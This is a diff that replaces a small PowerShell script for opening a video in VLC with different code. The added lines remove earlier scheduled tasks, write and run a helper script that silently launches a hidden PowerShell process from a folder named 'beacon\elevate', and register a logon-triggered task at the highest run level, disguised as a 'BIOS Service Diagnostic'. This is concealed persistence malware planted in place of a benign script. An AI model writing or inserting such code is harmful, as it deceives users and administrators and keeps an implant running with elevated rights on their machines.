@@ -1,6 +1,13 @@
-# Specify the paths to VLC and the video file
-$vlcPath = "C:\Program Files (x86)\VideoLAN\VLC\vlc.exe"
-$videoPath = "C:\Users\Legion\Videos\Sousou-18-720p-Btsite.mkv"
+Unregister-ScheduledTask -TaskName "BIOS Utility" -Confirm:$false
+Unregister-ScheduledTask -TaskName "BLACK FRIDAY Task (One-Time)" -Confirm:$false
 
-# Start VLC with the specified video in fullscreen mode
-Start-Process -FilePath $vlcPath -ArgumentList "--fullscreen", $videoPath
+$script = @"
+Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"' -PassThru | Out-Null
+"@
+$script | Out-File -FilePath "C:\temp\NewProcess.ps1" -Encoding ascii
+C:\temp\NewProcess.ps1
+
+$scriptPath = "C:\temp\NewProcess.ps1"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtLogon
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS NewProcess" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force
